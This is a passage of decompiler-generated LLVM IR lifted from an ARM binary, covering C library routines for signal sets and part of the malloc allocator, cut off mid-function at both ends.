  %v0_15840 = call i32 @__sigaddset()
  %v0_15848 = load i32, i32* @r5, align 4
  %v0_1584c = load i32, i32* @r6, align 4
  %v2_1584c = add i32 %v0_1584c, 26592
  %v2_15850 = call i32 @__GI___sigismember(i32 %v2_1584c, i32 %v0_15848)
  store i32 %v2_157f0, i32* %r2.global-to-local, align 4
  %v0_15868 = load i32, i32* @r5, align 4
  %v3_15870 = call i32 @__libc_sigaction(i32 %v0_15868, i32 %v2_15828, i32 %v2_157f0)
  %v1_15874 = icmp slt i32 %v3_15870, 0
  br i1 %v1_15874, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_15828
  %v5_15878 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_15878, i32* %r2.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_15828
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_15814, %bb32
  %v0_15880 = phi i32 [ %v5_15878, %bb31 ], [ %v0_15880.pre, %dec_label_pc_15814 ], [ -1, %bb32 ]
  %v2_15888 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15888, i32* @r4, align 4
  store i32 %v6_157e0, i32* @r5, align 4
  store i32 %v9_157e0, i32* @r6, align 4
  ret i32 %v0_15880

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 65, { 1, 2, 3, 5, 4, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15814, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_15898 = add i32 %arg2, -1
  %v3_1589c = udiv i32 %v1_15898, 32
  %v4_158a0 = mul nuw nsw i32 %v3_1589c, 4
  %v5_158a0 = add i32 %v4_158a0, %arg1
  %v6_158a0 = inttoptr i32 %v5_158a0 to i32*
  %v7_158a0 = load i32, i32* %v6_158a0, align 4
  %v1_158a4 = urem i32 %v1_15898, 32
  %v7_158ac = shl i32 1, %v1_158a4
  %v8_158ac = and i32 %v7_158a0, %v7_158ac
  %v10_158ac = icmp ne i32 %v8_158ac, 0
  %. = zext i1 %v10_158ac to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_15898, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_158bc = load i32, i32* @r1, align 4
  %v1_158bc = add i32 %v0_158bc, -1
  %v3_158c0 = udiv i32 %v1_158bc, 32
  %v0_158c4 = load i32, i32* @r0, align 4
  %v4_158c4 = mul nuw nsw i32 %v3_158c0, 4
  %v5_158c4 = add i32 %v0_158c4, %v4_158c4
  %v6_158c4 = inttoptr i32 %v5_158c4 to i32*
  %v7_158c4 = load i32, i32* %v6_158c4, align 4
  %v1_158c8 = urem i32 %v1_158bc, 32
  %v7_158d0 = shl i32 1, %v1_158c8
  %v8_158d0 = or i32 %v7_158c4, %v7_158d0
  store i32 %v8_158d0, i32* %v6_158c4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_158bc, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_158e0 = add i32 %arg2, -1
  %v3_158e4 = udiv i32 %v1_158e0, 32
  %v4_158e8 = mul nuw nsw i32 %v3_158e4, 4
  %v5_158e8 = add i32 %v4_158e8, %arg1
  %v6_158e8 = inttoptr i32 %v5_158e8 to i32*
  %v7_158e8 = load i32, i32* %v6_158e8, align 4
  %v1_158ec = urem i32 %v1_158e0, 32
  %tmp = shl i32 -1, %v1_158ec
  %v8_158f4 = add i32 %tmp, -1
  %v9_158f4 = and i32 %v7_158e8, %v8_158f4
  store i32 %v9_158f4, i32* %v6_158e8, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_158e0, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_15904 = udiv i32 %arg1, 256
  store i32 %v3_15904, i32* %r1.global-to-local, align 4
  %v2_15908 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_15908, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_15914 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_15908, i32 %v0_15914)
  %v0_15918 = load i32, i32* %r1.global-to-local, align 4
  %v1_15918 = add i32 %v0_15918, 1048320
  %v3_1591c = udiv i32 %v1_15918, 65536
  %v1_15920 = and i32 %v3_1591c, 8
  %v6_15924 = shl i32 %v0_15918, %v1_15920
  %v1_15928 = add i32 %v6_15924, 520192
  %v3_1592c = udiv i32 %v1_15928, 65536
  %v1_15930 = and i32 %v3_1592c, 4
  %v6_15934 = shl i32 %v6_15924, %v1_15930
  %v1_15938 = add i32 %v6_15934, 245760
  %v3_1593c = udiv i32 %v1_15938, 65536
  %v1_15940 = and i32 %v3_1593c, 2
  %v6_15944 = shl i32 %v6_15934, %v1_15940
  store i32 %v6_15944, i32* %r1.global-to-local, align 4
  %v1_15948 = sub nsw i32 13, %v1_15920
  %v2_1594c = sub nsw i32 %v1_15948, %v1_15930
  %v3_15950 = udiv i32 %v6_15944, 32768
  %v4_15950 = sub nuw nsw i32 -1, %v3_15950
  %v4_15954 = udiv i32 %v6_15944, 16384
  %v5_15954 = and i32 %v4_15954, %v4_15950
  %v2_15958 = sub nsw i32 %v2_1594c, %v1_15940
  %v2_1595c = add nsw i32 %v2_15958, %v5_15954
  %v1_15960 = add nsw i32 %v2_1595c, 6
  %v0_15964 = load i32, i32* %ip.global-to-local, align 4
  %v6_15964 = lshr i32 %v0_15964, %v1_15960
  %v3_15968 = mul nsw i32 %v2_1595c, 4
  %v1_1596c = add nsw i32 %v3_15968, 32
  %v1_15970 = urem i32 %v6_15964, 4
  %v2_15974 = or i32 %v1_15970, %v1_1596c
  ret i32 %v2_15974

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_1597c = load i32, i32* @r4, align 4
  %v6_1597c = load i32, i32* @r5, align 4
  %v9_1597c = load i32, i32* @r6, align 4
  %v12_1597c = load i32, i32* @r7, align 4
  %v15_1597c = load i32, i32* @r8, align 4
  %v18_1597c = load i32, i32* @sb, align 4
  %v21_1597c = load i32, i32* @sl, align 4
  %v24_1597c = load i32, i32* @fp, align 4
  %v27_1597c = load i32, i32* @lr, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r1.global-to-local, align 4
  %v4_15990 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 72) to i32*), align 4
  store i32 %v4_15990, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_1599c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 36) to i32*), align 4
  store i32 %v4_1599c, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %v4_15990, i32* %r2.global-to-local, align 4
  %v2_159a8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_159a8, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %ip.global-to-local, align 4
  %v4_159b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 76) to i32*), align 4
  store i32 %v4_159b4, i32* %ip.global-to-local, align 4
  store i32 88512, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_159b4)
  %v0_159c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_159c0, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r1.global-to-local, align 4
  %v4_159cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 16) to i32*), align 4
  store i32 %v4_159cc, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_159d8.953 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_159cc)
  %v0_159d8 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_159d8, -32
  br i1 %tmp, label %dec_label_pc_159f4, label %dec_label_pc_159e0

dec_label_pc_159e0:                               ; preds = %entry
  %v0_159e0 = call i32 @__GI___errno_location()
  store i32 %v0_159e0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  %v2_159ec = inttoptr i32 %v0_159e0 to i32*
  store i32 12, i32* %v2_159ec, align 4
  br label %dec_label_pc_16270

dec_label_pc_159f4:                               ; preds = %entry
  %v1_159f4 = add i32 %v0_159d8, 11
  store i32 %v1_159f4, i32* %r0.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r2.global-to-local, align 4
  %v2_15a00 = icmp ugt i32 %v1_159f4, 14
  %v7_15a00 = icmp eq i32 %v1_159f4, 15
  %v2_15a04 = xor i1 %v7_15a00, true
  %v3_15a04 = and i1 %v2_15a00, %v2_15a04
  br i1 %v3_15a04, label %bb, label %bb138

bb:                                               ; preds = %dec_label_pc_159f4
  %v5_15a04 = and i32 %v1_159f4, -8
  store i32 %v5_15a04, i32* @sl, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_159f4, %bb
  %v4_15a08 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 32) to i32*), align 4
  store i32 %v4_15a08, i32* @r0, align 4
  %v1_15a0c = inttoptr i32 %v4_15a08 to i32*
  %v2_15a0c = load i32, i32* %v1_15a0c, align 4
  store i32 %v2_15a0c, i32* @r4, align 4
  %v2_15a10 = xor i1 %v2_15a00, true
  %v3_15a10 = or i1 %v7_15a00, %v2_15a10
  br i1 %v3_15a10, label %bb139, label %bb140

bb139:                                            ; preds = %bb138
  store i32 16, i32* @sl, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_15a14 = urem i32 %v2_15a0c, 2
  %v2_15a14 = icmp eq i32 %v1_15a14, 0
  br i1 %v2_15a14, label %dec_label_pc_15a1c, label %dec_label_pc_15a2c

dec_label_pc_15a1c:                               ; preds = %bb140
  %v2_15a1c = icmp eq i32 %v2_15a0c, 0
  br i1 %v2_15a1c, label %dec_label_pc_15a24, label %dec_label_pc_15e08

dec_label_pc_15a24:                               ; preds = %dec_label_pc_15a1c
  %v0_15a24 = call i32 @__malloc_consolidate()
  store i32 %v0_15a24, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15e08

dec_label_pc_15a2c:                               ; preds = %bb140
  %v0_15a2c = load i32, i32* @sl, align 4
  %tmp201 = icmp ugt i32 %v0_15a2c, %v2_15a0c
  br i1 %tmp201, label %dec_label_pc_15a54, label %dec_label_pc_15a34

dec_label_pc_15a34:                               ; preds = %dec_label_pc_15a2c
  %v1_15a34 = add i32 %v4_15a08, -4
  store i32 %v1_15a34, i32* %r1.global-to-local, align 4
  %v3_15a38 = udiv i32 %v0_15a2c, 8
  store i32 %v3_15a38, i32* %r2.global-to-local, align 4
  %v4_15a3c = mul nuw i32 %v3_15a38, 4
  %v5_15a3c = add i32 %v4_15a3c, %v1_15a34
  %v6_15a3c = inttoptr i32 %v5_15a3c to i32*
  %v7_15a3c = load i32, i32* %v6_15a3c, align 4
  store i32 %v7_15a3c, i32* %r0.global-to-local, align 4
  %v2_15a40 = icmp eq i32 %v7_15a3c, 0
  br i1 %v2_15a40, label %dec_label_pc_15a54, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15a34
  %v2_15a44 = add i32 %v7_15a3c, 8
  %v3_15a44 = inttoptr i32 %v2_15a44 to i32*
  %v4_15a44 = load i32, i32* %v3_15a44, align 4
  store i32 %v4_15a44, i32* %r3.global-to-local, align 4
  store i32 %v2_15a44, i32* %r0.global-to-local, align 4
  store i32 %v2_15a44, i32* %r4.global-to-local, align 4
  store i32 %v4_15a44, i32* %v6_15a3c, align 4
  br label %dec_label_pc_16254

dec_label_pc_15a54:                               ; preds = %dec_label_pc_15a34, %dec_label_pc_15a2c
  %tmp202 = icmp ugt i32 %v0_15a2c, 255
  br i1 %tmp202, label %dec_label_pc_15aa4, label %dec_label_pc_15a5c

dec_label_pc_15a5c:                               ; preds = %dec_label_pc_15a54
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_15a64 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 32) to i32*), align 4
  %v3_15a68 = udiv i32 %v0_15a2c, 8
  store i32 %v3_15a68, i32* @r7, align 4
  %v4_15a6c = mul nuw i32 %v3_15a68, 8
  %v5_15a6c = add i32 %v4_15a64, %v4_15a6c
  store i32 %v5_15a6c, i32* %r3.global-to-local, align 4
  %v1_15a70 = add i32 %v5_15a6c, 44
  store i32 %v1_15a70, i32* %ip.global-to-local, align 4
  %v1_15a74 = add i32 %v5_15a6c, 56
  %v2_15a74 = inttoptr i32 %v1_15a74 to i32*
  %v3_15a74 = load i32, i32* %v2_15a74, align 4
  store i32 %v3_15a74, i32* %r0.global-to-local, align 4
  %v9_15a78 = icmp eq i32 %v3_15a74, %v1_15a70
  br i1 %v9_15a78, label %dec_label_pc_15c04, label %dec_label_pc_15a80

dec_label_pc_15a80:                               ; preds = %dec_label_pc_15a5c
  %v2_15a80 = add i32 %v3_15a74, %v0_15a2c
  store i32 %v2_15a80, i32* %r3.global-to-local, align 4
  %v1_15a84 = add i32 %v2_15a80, 4
  %v2_15a84 = inttoptr i32 %v1_15a84 to i32*
  %v3_15a84 = load i32, i32* %v2_15a84, align 4
  store i32 %v3_15a84, i32* %r2.global-to-local, align 4
  %v1_15a88 = add i32 %v3_15a74, 12
  %v2_15a88 = inttoptr i32 %v1_15a88 to i32*
  %v3_15a88 = load i32, i32* %v2_15a88, align 4
  store i32 %v3_15a88, i32* %r1.global-to-local, align 4
  %v1_15a8c = or i32 %v3_15a84, 1
  store i32 %v1_15a8c, i32* %r2.global-to-local, align 4
  %v1_15a90 = add i32 %v3_15a74, 8
  store i32 %v1_15a90, i32* %r4.global-to-local, align 4
  store i32 %v1_15a8c, i32* %v2_15a84, align 4
  %v0_15a98 = load i32, i32* %ip.global-to-local, align 4
  %v1_15a98 = load i32, i32* %r1.global-to-local, align 4
  %v2_15a98 = add i32 %v1_15a98, 8
  %v3_15a98 = inttoptr i32 %v2_15a98 to i32*
  store i32 %v0_15a98, i32* %v3_15a98, align 4
  %v0_15a9c = load i32, i32* %r1.global-to-local, align 4
  %v1_15a9c = load i32, i32* %ip.global-to-local, align 4
  %v2_15a9c = add i32 %v1_15a9c, 12
  %v3_15a9c = inttoptr i32 %v2_15a9c to i32*
  store i32 %v0_15a9c, i32* %v3_15a9c, align 4
  br label %dec_label_pc_16254

dec_label_pc_15aa4:                               ; preds = %dec_label_pc_15a54
  store i32 %v0_15a2c, i32* %r0.global-to-local, align 4
  %v1_15aa8 = call i32 @__malloc_largebin_index(i32 %v0_15a2c)
  store i32 %v1_15aa8, i32* %r0.global-to-local, align 4
  %v0_15aac = load i32, i32* @r4, align 4
  %v1_15aac = and i32 %v0_15aac, 2
  %v2_15aac = icmp eq i32 %v1_15aac, 0
  store i32 %v1_15aa8, i32* @r7, align 4
  br i1 %v2_15aac, label %dec_label_pc_15c04, label %dec_label_pc_15ab8

dec_label_pc_15ab8:                               ; preds = %dec_label_pc_15aa4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r1.global-to-local, align 4
  %v4_15ac0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 32) to i32*), align 4
  store i32 %v4_15ac0, i32* @r0, align 4
  %v0_15ac4 = call i32 @__malloc_consolidate()
  store i32 %v0_15ac4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15c04

dec_label_pc_15acc:                               ; preds = %dec_label_pc_15c18
  %v1_15acc = add i32 %v3_15c18, 4
  %v2_15acc = inttoptr i32 %v1_15acc to i32*
  %v3_15acc = load i32, i32* %v2_15acc, align 4
  store i32 %v3_15acc, i32* %r3.global-to-local, align 4
  %v0_15ad0 = load i32, i32* @sl, align 4
  %v1_15ad4 = and i32 %v3_15acc, -4
  store i32 %v1_15ad4, i32* %r4.global-to-local, align 4
  %v1_15ad8 = add i32 %v3_15c18, 12
  %v2_15ad8 = inttoptr i32 %v1_15ad8 to i32*
  %v3_15ad8 = load i32, i32* %v2_15ad8, align 4
  store i32 %v3_15ad8, i32* %ip.global-to-local, align 4
  %tmp203 = icmp ugt i32 %v0_15ad0, 255
  br i1 %tmp203, label %dec_label_pc_15b34, label %dec_label_pc_15ae0

dec_label_pc_15ae0:                               ; preds = %dec_label_pc_15acc
  %v9_15ae0 = icmp eq i32 %v3_15ad8, %v0_15b38
  br i1 %v9_15ae0, label %dec_label_pc_15ae8, label %dec_label_pc_15b34

dec_label_pc_15ae8:                               ; preds = %dec_label_pc_15ae0
  %v0_15ae8 = load i32, i32* @sb, align 4
  %v1_15ae8 = add i32 %v0_15ae8, 48
  %v2_15ae8 = inttoptr i32 %v1_15ae8 to i32*
  %v3_15ae8 = load i32, i32* %v2_15ae8, align 4
  store i32 %v3_15ae8, i32* %r3.global-to-local, align 4
  %v9_15aec = icmp eq i32 %v3_15c18, %v3_15ae8
  br i1 %v9_15aec, label %dec_label_pc_15af4, label %dec_label_pc_15b34

dec_label_pc_15af4:                               ; preds = %dec_label_pc_15ae8
  %v1_15af4 = load i32, i32* @fp, align 4
  %tmp204 = icmp ugt i32 %v1_15ad4, %v1_15af4
  br i1 %tmp204, label %dec_label_pc_15afc, label %dec_label_pc_15b34

dec_label_pc_15afc:                               ; preds = %dec_label_pc_15af4
  %v2_15afc = sub i32 %v1_15ad4, %v0_15ad0
  store i32 %v2_15afc, i32* %r2.global-to-local, align 4
  %v2_15b00 = add i32 %v0_15ad0, %v3_15c18
  store i32 %v2_15b00, i32* %r3.global-to-local, align 4
  %v1_15b04 = or i32 %v0_15ad0, 1
  store i32 %v1_15b04, i32* %r0.global-to-local, align 4
  %v1_15b08 = or i32 %v2_15afc, 1
  store i32 %v1_15b08, i32* %r1.global-to-local, align 4
  %v1_15b0c = add i32 %v3_15c18, 8
  store i32 %v1_15b0c, i32* %r4.global-to-local, align 4
  %v2_15b10 = add i32 %v0_15b38, 8
  %v3_15b10 = inttoptr i32 %v2_15b10 to i32*
  store i32 %v2_15b00, i32* %v3_15b10, align 4
  %v0_15b14 = load i32, i32* %r3.global-to-local, align 4
  %v1_15b14 = load i32, i32* %ip.global-to-local, align 4
  %v2_15b14 = add i32 %v1_15b14, 12
  %v3_15b14 = inttoptr i32 %v2_15b14 to i32*
  store i32 %v0_15b14, i32* %v3_15b14, align 4
  %v0_15b18 = load i32, i32* %r0.global-to-local, align 4
  %v1_15b18 = load i32, i32* @r6, align 4
  %v2_15b18 = add i32 %v1_15b18, 4
  %v3_15b18 = inttoptr i32 %v2_15b18 to i32*
  store i32 %v0_15b18, i32* %v3_15b18, align 4
  %v0_15b1c = load i32, i32* %r3.global-to-local, align 4
  %v1_15b1c = load i32, i32* @sb, align 4
  %v2_15b1c = add i32 %v1_15b1c, 48
  %v3_15b1c = inttoptr i32 %v2_15b1c to i32*
  store i32 %v0_15b1c, i32* %v3_15b1c, align 4
  %v0_15b20 = load i32, i32* %r2.global-to-local, align 4
  %v1_15b20 = load i32, i32* %r3.global-to-local, align 4
  %v3_15b20 = add i32 %v1_15b20, %v0_15b20
  %v4_15b20 = inttoptr i32 %v3_15b20 to i32*
  store i32 %v0_15b20, i32* %v4_15b20, align 4
  %v0_15b24 = load i32, i32* %r1.global-to-local, align 4
  %v1_15b24 = load i32, i32* %r3.global-to-local, align 4
  %v2_15b24 = add i32 %v1_15b24, 4
  %v3_15b24 = inttoptr i32 %v2_15b24 to i32*
  store i32 %v0_15b24, i32* %v3_15b24, align 4
  %v0_15b28 = load i32, i32* %ip.global-to-local, align 4
  %v1_15b28 = load i32, i32* %r3.global-to-local, align 4
  %v2_15b28 = add i32 %v1_15b28, 12
  %v3_15b28 = inttoptr i32 %v2_15b28 to i32*
  store i32 %v0_15b28, i32* %v3_15b28, align 4
  %v0_15b2c = load i32, i32* %ip.global-to-local, align 4
  %v1_15b2c = load i32, i32* %r3.global-to-local, align 4
  %v2_15b2c = add i32 %v1_15b2c, 8
  %v3_15b2c = inttoptr i32 %v2_15b2c to i32*
  store i32 %v0_15b2c, i32* %v3_15b2c, align 4
  br label %dec_label_pc_16254

dec_label_pc_15b34:                               ; preds = %dec_label_pc_15af4, %dec_label_pc_15ae8, %dec_label_pc_15ae0, %dec_label_pc_15acc
  %v9_15b34 = icmp eq i32 %v1_15ad4, %v0_15ad0
  %v2_15b38 = add i32 %v3_15ad8, 8
  %v3_15b38 = inttoptr i32 %v2_15b38 to i32*
  store i32 %v0_15b38, i32* %v3_15b38, align 4
  %v0_15b3c = load i32, i32* %ip.global-to-local, align 4
  %v1_15b3c = load i32, i32* %r5.global-to-local, align 4
  %v2_15b3c = add i32 %v1_15b3c, 12
  %v3_15b3c = inttoptr i32 %v2_15b3c to i32*
  store i32 %v0_15b3c, i32* %v3_15b3c, align 4
  br i1 %v9_15b34, label %dec_label_pc_15c94.loopexit, label %dec_label_pc_15b50

dec_label_pc_15b50:                               ; preds = %dec_label_pc_15b34
  %v0_15b50 = load i32, i32* %r4.global-to-local, align 4
  %tmp205 = icmp ugt i32 %v0_15b50, 255
  br i1 %tmp205, label %dec_label_pc_15b74, label %dec_label_pc_15b58

dec_label_pc_15b58:                               ; preds = %dec_label_pc_15b50
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r2.global-to-local, align 4
  %v1_15b5c = load i32, i32* %r8.global-to-local, align 4
  %v2_15b5c = add i32 %v1_15b5c, ptrtoint (i32* @global_var_2947c.811 to i32)
  %v3_15b5c = inttoptr i32 %v2_15b5c to i32*
  %v4_15b5c = load i32, i32* %v3_15b5c, align 4
  %v3_15b60 = udiv i32 %v0_15b50, 8
  store i32 %v3_15b60, i32* %r0.global-to-local, align 4
  %v4_15b64 = mul nuw i32 %v3_15b60, 8
  %v5_15b64 = add i32 %v4_15b5c, %v4_15b64
  store i32 %v5_15b64, i32* %r3.global-to-local, align 4
  %v1_15b68 = add i32 %v5_15b64, 44
  store i32 %v1_15b68, i32* %ip.global-to-local, align 4
  %v1_15b6c = add i32 %v5_15b64, 52
  %v2_15b6c = inttoptr i32 %v1_15b6c to i32*
  %v3_15b6c = load i32, i32* %v2_15b6c, align 4
  store i32 %v3_15b6c, i32* @lr, align 4
  br label %dec_label_pc_15bcc

dec_label_pc_15b74:                               ; preds = %dec_label_pc_15b50
  store i32 %v0_15b50, i32* %r0.global-to-local, align 4
  %v1_15b78 = call i32 @__malloc_largebin_index(i32 %v0_15b50)
  store i32 %v1_15b78, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %ip.global-to-local, align 4
  %v1_15b80 = load i32, i32* %r8.global-to-local, align 4
  %v2_15b80 = add i32 %v1_15b80, ptrtoint (i32* @global_var_2947c.811 to i32)
  %v3_15b80 = inttoptr i32 %v2_15b80 to i32*
  %v4_15b80 = load i32, i32* %v3_15b80, align 4
  %v4_15b84 = mul i32 %v1_15b78, 8
  %v5_15b84 = add i32 %v4_15b80, %v4_15b84
  store i32 %v5_15b84, i32* %r3.global-to-local, align 4
  %v1_15b88 = add i32 %v5_15b84, 44
  store i32 %v1_15b88, i32* %ip.global-to-local, align 4
  %v1_15b8c = add i32 %v5_15b84, 52
  %v2_15b8c = inttoptr i32 %v1_15b8c to i32*
  %v3_15b8c = load i32, i32* %v2_15b8c, align 4
  store i32 %v3_15b8c, i32* @lr, align 4
  %v9_15b90 = icmp eq i32 %v3_15b8c, %v1_15b88
  br i1 %v9_15b90, label %dec_label_pc_15bcc, label %dec_label_pc_15b98

dec_label_pc_15b98:                               ; preds = %dec_label_pc_15b74
  %v1_15b98 = add i32 %v5_15b84, 56
  %v2_15b98 = inttoptr i32 %v1_15b98 to i32*
  %v3_15b98 = load i32, i32* %v2_15b98, align 4
  store i32 %v3_15b98, i32* %r1.global-to-local, align 4
  %v1_15b9c = add i32 %v3_15b98, 4
  %v2_15b9c = inttoptr i32 %v1_15b9c to i32*
  %v3_15b9c = load i32, i32* %v2_15b9c, align 4
  store i32 %v3_15b9c, i32* %r3.global-to-local, align 4
  %v0_15ba0 = load i32, i32* %r4.global-to-local, align 4
  %v3_15ba0 = icmp ult i32 %v0_15ba0, %v3_15b9c
  br i1 %v3_15ba0, label %.thread, label %dec_label_pc_15bbc.preheader

.thread:                                          ; preds = %dec_label_pc_15b98
  store i32 %v1_15b88, i32* @lr, align 4
  store i32 %v3_15b98, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15bcc

dec_label_pc_15bbc.preheader:                     ; preds = %dec_label_pc_15b98
  %v2_15ba8 = or i32 %v0_15ba0, 1
  store i32 %v2_15ba8, i32* %r2.global-to-local, align 4
  %v1_15bbc179 = add i32 %v3_15b8c, 4
  %v2_15bbc180 = inttoptr i32 %v1_15bbc179 to i32*
  %v3_15bbc181 = load i32, i32* %v2_15bbc180, align 4
  store i32 %v3_15bbc181, i32* %r3.global-to-local, align 4
  %v3_15bc0183 = icmp ult i32 %v2_15ba8, %v3_15bbc181
  br i1 %v3_15bc0183, label %dec_label_pc_15bb8, label %dec_label_pc_15bc8

dec_label_pc_15bb8:                               ; preds = %dec_label_pc_15bbc.preheader, %dec_label_pc_15bb8
  %v0_15bc8184 = phi i32 [ %v3_15bb8, %dec_label_pc_15bb8 ], [ %v3_15b8c, %dec_label_pc_15bbc.preheader ]
  %v1_15bb8 = add i32 %v0_15bc8184, 8
  %v2_15bb8 = inttoptr i32 %v1_15bb8 to i32*
  %v3_15bb8 = load i32, i32* %v2_15bb8, align 4
  store i32 %v3_15bb8, i32* @lr, align 4
  %v1_15bbc = add i32 %v3_15bb8, 4
  %v2_15bbc = inttoptr i32 %v1_15bbc to i32*
  %v3_15bbc = load i32, i32* %v2_15bbc, align 4
  store i32 %v3_15bbc, i32* %r3.global-to-local, align 4
  %v3_15bc0 = icmp ult i32 %v2_15ba8, %v3_15bbc
  br i1 %v3_15bc0, label %dec_label_pc_15bb8, label %dec_label_pc_15bc8

dec_label_pc_15bc8:                               ; preds = %dec_label_pc_15bb8, %dec_label_pc_15bbc.preheader
  %v0_15bc8.lcssa = phi i32 [ %v3_15b8c, %dec_label_pc_15bbc.preheader ], [ %v3_15bb8, %dec_label_pc_15bb8 ]
  %v1_15bc8 = add i32 %v0_15bc8.lcssa, 12
  %v2_15bc8 = inttoptr i32 %v1_15bc8 to i32*
  %v3_15bc8 = load i32, i32* %v2_15bc8, align 4
  store i32 %v3_15bc8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15bcc

dec_label_pc_15bcc:                               ; preds = %.thread, %dec_label_pc_15b74, %dec_label_pc_15b58, %dec_label_pc_15bc8
  %v0_15bec = phi i32 [ %v1_15b88, %dec_label_pc_15b74 ], [ %v1_15b68, %dec_label_pc_15b58 ], [ %v3_15bc8, %dec_label_pc_15bc8 ], [ %v3_15b98, %.thread ]
  %v0_15be0 = phi i32 [ %v1_15b78, %dec_label_pc_15b74 ], [ %v3_15b60, %dec_label_pc_15b58 ], [ %v1_15b78, %dec_label_pc_15bc8 ], [ %v1_15b78, %.thread ]
  %v1_15bd0 = phi i32 [ %v1_15b80, %dec_label_pc_15b74 ], [ %v1_15b5c, %dec_label_pc_15b58 ], [ %v1_15b80, %dec_label_pc_15bc8 ], [ %v1_15b80, %.thread ]
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r2.global-to-local, align 4
  %v2_15bd0 = add i32 %v1_15bd0, ptrtoint (i32* @global_var_2947c.811 to i32)
  %v3_15bd0 = inttoptr i32 %v2_15bd0 to i32*
  %v4_15bd0 = load i32, i32* %v3_15bd0, align 4
  %v3_15bd4 = sdiv i32 %v0_15be0, 32
  store i32 %v3_15bd4, i32* %r3.global-to-local, align 4
  %v4_15bd8 = mul nsw i32 %v3_15bd4, 4
  %v5_15bd8 = add i32 %v4_15bd0, %v4_15bd8
  store i32 %v5_15bd8, i32* %r1.global-to-local, align 4
